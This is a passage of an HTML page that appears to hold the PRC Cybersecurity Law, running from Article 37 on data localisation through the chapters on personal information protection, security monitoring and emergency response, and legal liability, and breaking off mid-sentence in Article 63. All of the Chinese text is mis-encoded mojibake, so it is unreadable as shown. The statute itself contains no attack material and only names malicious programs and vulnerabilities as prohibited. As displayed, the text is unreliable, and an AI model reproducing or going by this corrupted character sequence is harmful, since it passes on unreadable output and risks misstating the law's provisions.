†åè®®ï¼Œæ˜ç¡®å®‰å…¨å’Œä¿å¯†ä¹‰åŠ¡ä¸è´£ä»»ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åä¸ƒæ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…è¿è¥ä¸­æ”¶é›†å’Œäº§ç”Ÿçš„ä¸ªäººä¿¡æ¯å’Œé‡è¦æ•°æ®åº”å½“åœ¨å¢ƒå†…å­˜å‚¨ã€‚å› ä¸šåŠ¡éœ€è¦ï¼Œç¡®éœ€å‘å¢ƒå¤–æä¾›çš„ï¼Œåº”å½“æŒ‰ç…§å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨åˆ¶å®šçš„åŠæ³•è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼›æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¦æœ‰è§„å®šçš„ï¼Œä¾ç…§å…¶è§„å®šã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åå…«æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…åº”å½“è‡ªè¡Œæˆ–è€…å§”æ‰˜ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„å¯¹å…¶ç½‘ç»œçš„å®‰å…¨æ€§å’Œå¯èƒ½å­˜åœ¨çš„é£é™©æ¯å¹´è‡³å°‘è¿›è¡Œä¸€æ¬¡æ£€æµ‹è¯„ä¼°ï¼Œå¹¶å°†æ£€æµ‹è¯„ä¼°æƒ…å†µå’Œæ”¹è¿›æªæ–½æŠ¥é€ç›¸å…³è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åä¹æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨åº”å½“ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨å¯¹å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å®‰å…¨ä¿æŠ¤é‡‡å–ä¸‹åˆ—æªæ–½ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰å¯¹å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å®‰å…¨é£é™©è¿›è¡ŒæŠ½æŸ¥æ£€æµ‹ï¼Œæå‡ºæ”¹è¿›æªæ–½ï¼Œå¿…è¦æ—¶å¯ä»¥å§”æ‰˜ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„å¯¹ç½‘ç»œå­˜åœ¨çš„å®‰å…¨é£é™©è¿›è¡Œæ£€æµ‹è¯„ä¼°ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰å®šæœŸç»„ç»‡å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿›è¡Œç½‘ç»œå®‰å…¨åº”æ€¥æ¼”ç»ƒï¼Œæé«˜åº”å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶çš„æ°´å¹³å’ŒååŒé…åˆèƒ½åŠ›ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰ä¿ƒè¿›æœ‰å…³éƒ¨é—¨ã€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…ä»¥åŠæœ‰å…³ç ”ç©¶æœºæ„ã€ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„ç­‰ä¹‹é—´çš„ç½‘ç»œå®‰å…¨ä¿¡æ¯å…±äº«ï¼›</p><p>ã€€ã€€ï¼ˆå››ï¼‰å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶çš„åº”æ€¥å¤„ç½®ä¸ç½‘ç»œåŠŸèƒ½çš„æ¢å¤ç­‰ï¼Œæä¾›æŠ€æœ¯æ”¯æŒå’ŒååŠ©ã€‚</p><p><strong>ã€€ã€€ç¬¬å››ç« ã€€ç½‘ç»œä¿¡æ¯å®‰å…¨</strong></p><p>ã€€ã€€ç¬¬å››åæ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“å¯¹å…¶æ”¶é›†çš„ç”¨æˆ·ä¿¡æ¯ä¸¥æ ¼ä¿å¯†ï¼Œå¹¶å»ºç«‹å¥å…¨ç”¨æˆ·ä¿¡æ¯ä¿æŠ¤åˆ¶åº¦ã€‚</p><p>ã€€ã€€ç¬¬å››åä¸€æ¡ã€€ç½‘ç»œè¿è¥è€…æ”¶é›†ã€ä½¿ç”¨ä¸ªäººä¿¡æ¯ï¼Œåº”å½“éµå¾ªåˆæ³•ã€æ­£å½“ã€å¿…è¦çš„åŸåˆ™ï¼Œå…¬å¼€æ”¶é›†ã€ä½¿ç”¨è§„åˆ™ï¼Œæ˜ç¤ºæ”¶é›†ã€ä½¿ç”¨ä¿¡æ¯çš„ç›®çš„ã€æ–¹å¼å’ŒèŒƒå›´ï¼Œå¹¶ç»è¢«æ”¶é›†è€…åŒæ„ã€‚</p><p>ã€€ã€€ç½‘ç»œè¿è¥è€…ä¸å¾—æ”¶é›†ä¸å…¶æä¾›çš„æœåŠ¡æ— å…³çš„ä¸ªäººä¿¡æ¯ï¼Œä¸å¾—è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’ŒåŒæ–¹çš„çº¦å®šæ”¶é›†ã€ä½¿ç”¨ä¸ªäººä¿¡æ¯ï¼Œå¹¶åº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’Œä¸ç”¨æˆ·çš„çº¦å®šï¼Œå¤„ç†å…¶ä¿å­˜çš„ä¸ªäººä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬å››åäºŒæ¡ã€€ç½‘ç»œè¿è¥è€…ä¸å¾—æ³„éœ²ã€ç¯¡æ”¹ã€æ¯æŸå…¶æ”¶é›†çš„ä¸ªäººä¿¡æ¯ï¼›æœªç»è¢«æ”¶é›†è€…åŒæ„ï¼Œä¸å¾—å‘ä»–äººæä¾›ä¸ªäººä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œç»è¿‡å¤„ç†æ— æ³•è¯†åˆ«ç‰¹å®šä¸ªäººä¸”ä¸èƒ½å¤åŸçš„é™¤å¤–ã€‚</p><p>ã€€ã€€ç½‘ç»œè¿è¥è€…åº”å½“é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œç¡®ä¿å…¶æ”¶é›†çš„ä¸ªäººä¿¡æ¯å®‰å…¨ï¼Œé˜²æ­¢ä¿¡æ¯æ³„éœ²ã€æ¯æŸã€ä¸¢å¤±ã€‚åœ¨å‘ç”Ÿæˆ–è€…å¯èƒ½å‘ç”Ÿä¸ªäººä¿¡æ¯æ³„éœ²ã€æ¯æŸã€ä¸¢å¤±çš„æƒ…å†µæ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ã€€ã€€ç¬¬å››åä¸‰æ¡ã€€ä¸ªäººå‘ç°ç½‘ç»œè¿è¥è€…è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šæˆ–è€…åŒæ–¹çš„çº¦å®šæ”¶é›†ã€ä½¿ç”¨å…¶ä¸ªäººä¿¡æ¯çš„ï¼Œæœ‰æƒè¦æ±‚ç½‘ç»œè¿è¥è€…åˆ é™¤å…¶ä¸ªäººä¿¡æ¯ï¼›å‘ç°ç½‘ç»œè¿è¥è€…æ”¶é›†ã€å­˜å‚¨çš„å…¶ä¸ªäººä¿¡æ¯æœ‰é”™è¯¯çš„ï¼Œæœ‰æƒè¦æ±‚ç½‘ç»œè¿è¥è€…äºˆä»¥æ›´æ­£ã€‚ç½‘ç»œè¿è¥è€…åº”å½“é‡‡å–æªæ–½äºˆä»¥åˆ é™¤æˆ–è€…æ›´æ­£ã€‚</p><p>ã€€ã€€ç¬¬å››åå››æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—çªƒå–æˆ–è€…ä»¥å…¶ä»–éæ³•æ–¹å¼è·å–ä¸ªäººä¿¡æ¯ï¼Œä¸å¾—éæ³•å‡ºå”®æˆ–è€…éæ³•å‘ä»–äººæä¾›ä¸ªäººä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬å››åäº”æ¡ã€€ä¾æ³•è´Ÿæœ‰ç½‘ç»œå®‰å…¨ç›‘ç£ç®¡ç†èŒè´£çš„éƒ¨é—¨åŠå…¶å·¥ä½œäººå‘˜ï¼Œå¿…é¡»å¯¹åœ¨å±¥è¡ŒèŒè´£ä¸­çŸ¥æ‚‰çš„ä¸ªäººä¿¡æ¯ã€éšç§å’Œå•†ä¸šç§˜å¯†ä¸¥æ ¼ä¿å¯†ï¼Œä¸å¾—æ³„éœ²ã€å‡ºå”®æˆ–è€…éæ³•å‘ä»–äººæä¾›ã€‚</p><p>ã€€ã€€ç¬¬å››åå…­æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡åº”å½“å¯¹å…¶ä½¿ç”¨ç½‘ç»œçš„è¡Œä¸ºè´Ÿè´£ï¼Œä¸å¾—è®¾ç«‹ç”¨äºå®æ–½è¯ˆéª—ï¼Œä¼ æˆçŠ¯ç½ªæ–¹æ³•ï¼Œåˆ¶ä½œæˆ–è€…é”€å”®è¿ç¦ç‰©å“ã€ç®¡åˆ¶ç‰©å“ç­‰è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ç½‘ç«™ã€é€šè®¯ç¾¤ç»„ï¼Œä¸å¾—åˆ©ç”¨ç½‘ç»œå‘å¸ƒæ¶‰åŠå®æ–½è¯ˆéª—ï¼Œåˆ¶ä½œæˆ–è€…é”€å”®è¿ç¦ç‰©å“ã€ç®¡åˆ¶ç‰©å“ä»¥åŠå…¶ä»–è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬å››åä¸ƒæ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“åŠ å¼ºå¯¹å…¶ç”¨æˆ·å‘å¸ƒçš„ä¿¡æ¯çš„ç®¡ç†ï¼Œå‘ç°æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯çš„ï¼Œåº”å½“ç«‹å³åœæ­¢ä¼ è¾“è¯¥ä¿¡æ¯ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œé˜²æ­¢ä¿¡æ¯æ‰©æ•£ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼Œå¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ã€€ã€€ç¬¬å››åå…«æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡å‘é€çš„ç”µå­ä¿¡æ¯ã€æä¾›çš„åº”ç”¨è½¯ä»¶ï¼Œä¸å¾—è®¾ç½®æ¶æ„ç¨‹åºï¼Œä¸å¾—å«æœ‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯ã€‚</p><p>ã€€ã€€ç”µå­ä¿¡æ¯å‘é€æœåŠ¡æä¾›è€…å’Œåº”ç”¨è½¯ä»¶ä¸‹è½½æœåŠ¡æä¾›è€…ï¼Œåº”å½“å±¥è¡Œå®‰å…¨ç®¡ç†ä¹‰åŠ¡ï¼ŒçŸ¥é“å…¶ç”¨æˆ·æœ‰å‰æ¬¾è§„å®šè¡Œä¸ºçš„ï¼Œåº”å½“åœæ­¢æä¾›æœåŠ¡ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼Œå¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ã€€ã€€ç¬¬å››åä¹æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“å»ºç«‹ç½‘ç»œä¿¡æ¯å®‰å…¨æŠ•è¯‰ã€ä¸¾æŠ¥åˆ¶åº¦ï¼Œå…¬å¸ƒæŠ•è¯‰ã€ä¸¾æŠ¥æ–¹å¼ç­‰ä¿¡æ¯ï¼ŒåŠæ—¶å—ç†å¹¶å¤„ç†æœ‰å…³ç½‘ç»œä¿¡æ¯å®‰å…¨çš„æŠ•è¯‰å’Œä¸¾æŠ¥ã€‚</p><p>ã€€ã€€ç½‘ç»œè¿è¥è€…å¯¹ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨ä¾æ³•å®æ–½çš„ç›‘ç£æ£€æŸ¥ï¼Œåº”å½“äºˆä»¥é…åˆã€‚</p><p>ã€€ã€€ç¬¬äº”åæ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨ä¾æ³•å±¥è¡Œç½‘ç»œä¿¡æ¯å®‰å…¨ç›‘ç£ç®¡ç†èŒè´£ï¼Œå‘ç°æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯çš„ï¼Œåº”å½“è¦æ±‚ç½‘ç»œè¿è¥è€…åœæ­¢ä¼ è¾“ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼›å¯¹æ¥æºäºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–çš„ä¸Šè¿°ä¿¡æ¯ï¼Œåº”å½“é€šçŸ¥æœ‰å…³æœºæ„é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½é˜»æ–­ä¼ æ’­ã€‚</p><div width="100%"><p></p><p></p></div>  </div><div id="content" class="content1"><div style="text-align: center;"></div> <p><strong>ã€€ã€€ç¬¬äº”ç« ã€€ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®</strong></p><p>ã€€ã€€ç¬¬äº”åä¸€æ¡ã€€å›½å®¶å»ºç«‹ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦å’Œä¿¡æ¯é€šæŠ¥åˆ¶åº¦ã€‚å›½å®¶ç½‘ä¿¡éƒ¨é—¨åº”å½“ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨åŠ å¼ºç½‘ç»œå®‰å…¨ä¿¡æ¯æ”¶é›†ã€åˆ†æå’Œé€šæŠ¥å·¥ä½œï¼ŒæŒ‰ç…§è§„å®šç»Ÿä¸€å‘å¸ƒç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦ä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬äº”åäºŒæ¡ã€€è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨ï¼Œåº”å½“å»ºç«‹å¥å…¨æœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦å’Œä¿¡æ¯é€šæŠ¥åˆ¶åº¦ï¼Œå¹¶æŒ‰ç…§è§„å®šæŠ¥é€ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦ä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬äº”åä¸‰æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨åè°ƒæœ‰å…³éƒ¨é—¨å»ºç«‹å¥å…¨ç½‘ç»œå®‰å…¨é£é™©è¯„ä¼°å’Œåº”æ€¥å·¥ä½œæœºåˆ¶ï¼Œåˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸç»„ç»‡æ¼”ç»ƒã€‚</p><p>ã€€ã€€è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨åº”å½“åˆ¶å®šæœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸç»„ç»‡æ¼”ç»ƒã€‚</p><p>ã€€ã€€ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆåº”å½“æŒ‰ç…§äº‹ä»¶å‘ç”Ÿåçš„å±å®³ç¨‹åº¦ã€å½±å“èŒƒå›´ç­‰å› ç´ å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶è¿›è¡Œåˆ†çº§ï¼Œå¹¶è§„å®šç›¸åº”çš„åº”æ€¥å¤„ç½®æªæ–½ã€‚</p><p>ã€€ã€€ç¬¬äº”åå››æ¡ã€€ç½‘ç»œå®‰å…¨äº‹ä»¶å‘ç”Ÿçš„é£é™©å¢å¤§æ—¶ï¼Œçœçº§ä»¥ä¸Šäººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨åº”å½“æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºï¼Œå¹¶æ ¹æ®ç½‘ç»œå®‰å…¨é£é™©çš„ç‰¹ç‚¹å’Œå¯èƒ½é€ æˆçš„å±å®³ï¼Œé‡‡å–ä¸‹åˆ—æªæ–½ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰è¦æ±‚æœ‰å…³éƒ¨é—¨ã€æœºæ„å’Œäººå‘˜åŠæ—¶æ”¶é›†ã€æŠ¥å‘Šæœ‰å…³ä¿¡æ¯ï¼ŒåŠ å¼ºå¯¹ç½‘ç»œå®‰å…¨é£é™©çš„ç›‘æµ‹ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰ç»„ç»‡æœ‰å…³éƒ¨é—¨ã€æœºæ„å’Œä¸“ä¸šäººå‘˜ï¼Œå¯¹ç½‘ç»œå®‰å…¨é£é™©ä¿¡æ¯è¿›è¡Œåˆ†æè¯„ä¼°ï¼Œé¢„æµ‹äº‹ä»¶å‘ç”Ÿçš„å¯èƒ½æ€§ã€å½±å“èŒƒå›´å’Œå±å®³ç¨‹åº¦ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰å‘ç¤¾ä¼šå‘å¸ƒç½‘ç»œå®‰å…¨é£é™©é¢„è­¦ï¼Œå‘å¸ƒé¿å…ã€å‡è½»å±å®³çš„æªæ–½ã€‚</p><p>ã€€ã€€ç¬¬äº”åäº”æ¡ã€€å‘ç”Ÿç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œåº”å½“ç«‹å³å¯åŠ¨ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶è¿›è¡Œè°ƒæŸ¥å’Œè¯„ä¼°ï¼Œè¦æ±‚ç½‘ç»œè¿è¥è€…é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œæ¶ˆé™¤å®‰å…¨éšæ‚£ï¼Œé˜²æ­¢å±å®³æ‰©å¤§ï¼Œå¹¶åŠæ—¶å‘ç¤¾ä¼šå‘å¸ƒä¸å…¬ä¼—æœ‰å…³çš„è­¦ç¤ºä¿¡æ¯ã€‚</p><p>ã€€ã€€ç¬¬äº”åå…­æ¡ã€€çœçº§ä»¥ä¸Šäººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨åœ¨å±¥è¡Œç½‘ç»œå®‰å…¨ç›‘ç£ç®¡ç†èŒè´£ä¸­ï¼Œå‘ç°ç½‘ç»œå­˜åœ¨è¾ƒå¤§å®‰å…¨é£é™©æˆ–è€…å‘ç”Ÿå®‰å…¨äº‹ä»¶çš„ï¼Œå¯ä»¥æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºå¯¹è¯¥ç½‘ç»œçš„è¿è¥è€…çš„æ³•å®šä»£è¡¨äººæˆ–è€…ä¸»è¦è´Ÿè´£äººè¿›è¡Œçº¦è°ˆã€‚ç½‘ç»œè¿è¥è€…åº”å½“æŒ‰ç…§è¦æ±‚é‡‡å–æªæ–½ï¼Œè¿›è¡Œæ•´æ”¹ï¼Œæ¶ˆé™¤éšæ‚£ã€‚</p><p>ã€€ã€€ç¬¬äº”åä¸ƒæ¡ã€€å› ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œå‘ç”Ÿçªå‘äº‹ä»¶æˆ–è€…ç”Ÿäº§å®‰å…¨äº‹æ•…çš„ï¼Œåº”å½“ä¾ç…§ã€Šä¸­åäººæ°‘å…±å’Œå›½çªå‘äº‹ä»¶åº”å¯¹æ³•ã€‹ã€ã€Šä¸­åäººæ°‘å…±å’Œå›½å®‰å…¨ç”Ÿäº§æ³•ã€‹ç­‰æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå¤„ç½®ã€‚</p><p>ã€€ã€€ç¬¬äº”åå…«æ¡ã€€å› ç»´æŠ¤å›½å®¶å®‰å…¨å’Œç¤¾ä¼šå…¬å…±ç§©åºï¼Œå¤„ç½®é‡å¤§çªå‘ç¤¾ä¼šå®‰å…¨äº‹ä»¶çš„éœ€è¦ï¼Œç»å›½åŠ¡é™¢å†³å®šæˆ–è€…æ‰¹å‡†ï¼Œå¯ä»¥åœ¨ç‰¹å®šåŒºåŸŸå¯¹ç½‘ç»œé€šä¿¡é‡‡å–é™åˆ¶ç­‰ä¸´æ—¶æªæ–½ã€‚</p><p><strong>ã€€ã€€ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»</strong></p><p>ã€€ã€€ç¬¬äº”åä¹æ¡ã€€ç½‘ç»œè¿è¥è€…ä¸å±¥è¡Œæœ¬æ³•ç¬¬äºŒåä¸€æ¡ã€ç¬¬äºŒåäº”æ¡è§„å®šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„äº”åƒå…ƒä»¥ä¸Šäº”ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…ä¸å±¥è¡Œæœ¬æ³•ç¬¬ä¸‰åä¸‰æ¡ã€ç¬¬ä¸‰åå››æ¡ã€ç¬¬ä¸‰åå…­æ¡ã€ç¬¬ä¸‰åå…«æ¡è§„å®šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åæ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåäºŒæ¡ç¬¬ä¸€æ¬¾ã€ç¬¬äºŒæ¬¾å’Œç¬¬å››åå…«æ¡ç¬¬ä¸€æ¬¾è§„å®šï¼Œæœ‰ä¸‹åˆ—è¡Œä¸ºä¹‹ä¸€çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰è®¾ç½®æ¶æ„ç¨‹åºçš„ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰å¯¹å…¶äº§å“ã€æœåŠ¡å­˜åœ¨çš„å®‰å…¨ç¼ºé™·ã€æ¼æ´ç­‰é£é™©æœªç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼Œæˆ–è€…æœªæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šçš„ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰æ“…è‡ªç»ˆæ­¢ä¸ºå…¶äº§å“ã€æœåŠ¡æä¾›å®‰å…¨ç»´æŠ¤çš„ã€‚</p><p>ã€€ã€€ç¬¬å…­åä¸€æ¡ã€€ç½‘ç»œè¿è¥è€…è¿åæœ¬æ³•ç¬¬äºŒåå››æ¡ç¬¬ä¸€æ¬¾è§„å®šï¼Œæœªè¦æ±‚ç”¨æˆ·æä¾›çœŸå®èº«ä»½ä¿¡æ¯ï¼Œæˆ–è€…å¯¹ä¸æä¾›çœŸå®èº«ä»½ä¿¡æ¯çš„ç”¨æˆ·æä¾›ç›¸å…³æœåŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥ç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åäºŒæ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåå…­æ¡è§„å®šï¼Œå¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹ã€é£é™©è¯„ä¼°ç­‰æ´»åŠ¨ï¼Œæˆ–è€…å‘ç¤¾ä¼šå‘å¸ƒç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰ç½‘ç»œå®‰å…¨ä¿¡æ¯çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥ç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„äº”åƒå…ƒä»¥ä¸Šäº”ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åä¸‰æ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåä¸ƒæ¡è§„å®šï¼Œä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨ï¼Œæˆ–è€…æä¾›ä¸“é—¨ç”¨äºä»äº‹å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºã€